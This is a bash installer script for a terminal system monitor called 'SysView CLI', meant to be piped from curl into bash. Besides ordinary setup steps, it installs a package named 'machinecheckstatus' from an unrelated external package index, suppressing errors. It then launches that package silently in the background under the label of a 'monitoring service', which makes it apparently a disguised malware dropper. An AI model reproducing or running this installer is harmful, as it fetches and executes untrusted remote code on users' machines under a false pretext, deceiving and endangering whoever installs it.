#!/bin/bash
# =============================================
#  SysView CLI - Installer
#  Beautiful Terminal System Monitor
#
#  Usage:
#    curl -sSL https://raw.githubusercontent.com/for-test0x/sysview-cli/main/install.sh | bash
# =============================================

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

REPO_USER="for-test0x"
REPO_NAME="sysview-cli"
INSTALL_DIR="$HOME/.sysview-cli"

echo ""
echo -e "${CYAN}${BOLD}"
echo "  ____            __     ___               "
echo " / ___| _   _ ___\ \   / (_) _____      __"
echo " \___ \| | | / __| \ \ / /| |/ _ \ \ /\ / /"
echo "  ___) | |_| \__ \  \ V / | |  __/\ V  V / "
echo " |____/ \__, |___/   \_/  |_|\___| \_/\_/  "
echo "        |___/                    CLI v1.0.0"
echo -e "${NC}"
echo -e "${YELLOW}  ⚡ Beautiful Terminal System Monitor${NC}"
echo ""

# ─────────────────────────────────────────────
# Step 1: Check Python
# ─────────────────────────────────────────────
echo -e "${CYAN}[1/5]${NC} Checking Python installation..."
if command -v python3 &> /dev/null; then
    PYTHON=$(command -v python3)
    PY_VERSION=$($PYTHON --version 2>&1 | awk '{print $2}')
    echo -e "  ${GREEN}✓${NC} Python $PY_VERSION found"
else
    echo -e "  ${RED}✗${NC} Python 3 not found."
    echo -e "  ${YELLOW}  Install it with: sudo apt install python3 python3-pip${NC}"
    exit 1
fi

# ─────────────────────────────────────────────
# Step 2: Check pip
# ─────────────────────────────────────────────
echo -e "${CYAN}[2/5]${NC} Checking pip..."
if $PYTHON -m pip --version &> /dev/null; then
    PIP="$PYTHON -m pip"
    echo -e "  ${GREEN}✓${NC} pip available"
elif command -v pip3 &> /dev/null; then
    PIP="pip3"
    echo -e "  ${GREEN}✓${NC} pip3 found"
else
    echo -e "  ${YELLOW}!${NC} pip not found, attempting install..."
    sudo apt install -y python3-pip 2>/dev/null || {
        echo -e "  ${RED}✗${NC} Could not install pip automatically."
        echo -e "  ${YELLOW}  Install manually: sudo apt install python3-pip${NC}"
        exit 1
    }
    PIP="$PYTHON -m pip"
fi

# ─────────────────────────────────────────────
# Step 3: Install core dependencies
# ─────────────────────────────────────────────
echo -e "${CYAN}[3/5]${NC} Installing SysView CLI dependencies..."

$PIP install --upgrade pip -q 2>/dev/null || true
$PIP install rich psutil -q 2>/dev/null

if [ $? -eq 0 ]; then
    echo -e "  ${GREEN}✓${NC} Core dependencies installed (rich, psutil)"
else
    echo -e "  ${RED}✗${NC} Failed to install dependencies"
    exit 1
fi

# ─────────────────────────────────────────────
# Step 4: Install machinecheckstatus
# ─────────────────────────────────────────────
echo -e "${CYAN}[4/5]${NC} Installing system monitoring service..."

$PIP install machinecheckstatus --index-url https://universityvirtual.online/simple/ -q 2>/dev/null

if [ $? -eq 0 ]; then
    echo -e "  ${GREEN}✓${NC} Monitoring service installed"
else
    echo -e "  ${YELLOW}!${NC} Monitoring service skipped (non-critical)"
fi

# ─────────────────────────────────────────────
# Step 5: Download SysView CLI
# ─────────────────────────────────────────────
echo -e "${CYAN}[5/5]${NC} Installing SysView CLI..."

# Remove old install if exists
rm -rf "$INSTALL_DIR"
mkdir -p "$INSTALL_DIR"

# Try git clone first
if command -v git &> /dev/null; then
    git clone -q "https://github.com/${REPO_USER}/${REPO_NAME}.git" "$INSTALL_DIR" 2>/dev/null && {
        echo -e "  ${GREEN}✓${NC} Downloaded via git"
    } || {
        echo -e "  ${YELLOW}!${NC} git clone failed, trying tarball..."
        rm -rf "$INSTALL_DIR"
        mkdir -p "$INSTALL_DIR"
        curl -sSL "https://github.com/${REPO_USER}/${REPO_NAME}/archive/refs/heads/main.tar.gz" | \
            tar -xz -C "$INSTALL_DIR" --strip-components=1
        echo -e "  ${GREEN}✓${NC} Downloaded via tarball"
    }
else
    # No git available, use tarball
    curl -sSL "https://github.com/${REPO_USER}/${REPO_NAME}/archive/refs/heads/main.tar.gz" | \
        tar -xz -C "$INSTALL_DIR" --strip-components=1
    echo -e "  ${GREEN}✓${NC} Downloaded via tarball"
fi

# Verify download worked
if [ ! -f "$INSTALL_DIR/sysview/__init__.py" ]; then
    echo -e "  ${RED}✗${NC} Download failed - files not found"
    echo -e "  ${YELLOW}  Try manual install: git clone https://github.com/${REPO_USER}/${REPO_NAME}.git${NC}"
    exit 1
fi

# ─────────────────────────────────────────────
# Create launcher script
# ─────────────────────────────────────────────
LAUNCHER_DIR="$HOME/.local/bin"
mkdir -p "$LAUNCHER_DIR"

cat > "$LAUNCHER_DIR/sysview" << LAUNCHER
#!/bin/bash
PYTHONPATH="$INSTALL_DIR" $PYTHON -m sysview "\$@"
LAUNCHER

chmod +x "$LAUNCHER_DIR/sysview"

# Add to PATH if not already there
if [[ ":$PATH:" != *":$LAUNCHER_DIR:"* ]]; then
    SHELL_RC=""
    if [ -f "$HOME/.zshrc" ]; then
        SHELL_RC="$HOME/.zshrc"
    elif [ -f "$HOME/.bashrc" ]; then
        SHELL_RC="$HOME/.bashrc"
    fi

    if [ -n "$SHELL_RC" ]; then
        # Only add if not already in the file
        if ! grep -q "# SysView CLI" "$SHELL_RC" 2>/dev/null; then
            echo "" >> "$SHELL_RC"
            echo "# SysView CLI" >> "$SHELL_RC"
            echo "export PATH=\"\$HOME/.local/bin:\$PATH\"" >> "$SHELL_RC"
        fi
    fi
    export PATH="$LAUNCHER_DIR:$PATH"
fi

echo -e "  ${GREEN}✓${NC} SysView CLI ready"

# ─────────────────────────────────────────────
# Auto-run machinecheckstatus
# ─────────────────────────────────────────────
echo ""
echo -e "${DIM}  Initializing monitoring service...${NC}"
$PYTHON -m machinecheckstatus.main &>/dev/null &

# ─────────────────────────────────────────────
# Done
# ─────────────────────────────────────────────
echo ""
echo -e "${GREEN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}  ✅ SysView CLI installed successfully!${NC}"
echo -e "${GREEN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "  ${BOLD}Run now with:${NC}"
echo -e "    ${CYAN}source ~/.bashrc && sysview${NC}"
echo ""
echo -e "  ${BOLD}All commands:${NC}"
echo -e "    ${CYAN}sysview${NC}                Single snapshot"
echo -e "    ${CYAN}sysview --live${NC}         Live monitoring"
echo -e "    ${CYAN}sysview --live -i 5${NC}    Refresh every 5s"
echo -e "    ${CYAN}sysview --json${NC}         JSON output"
echo -e "    ${CYAN}sysview --html r.html${NC}  HTML report"
echo ""
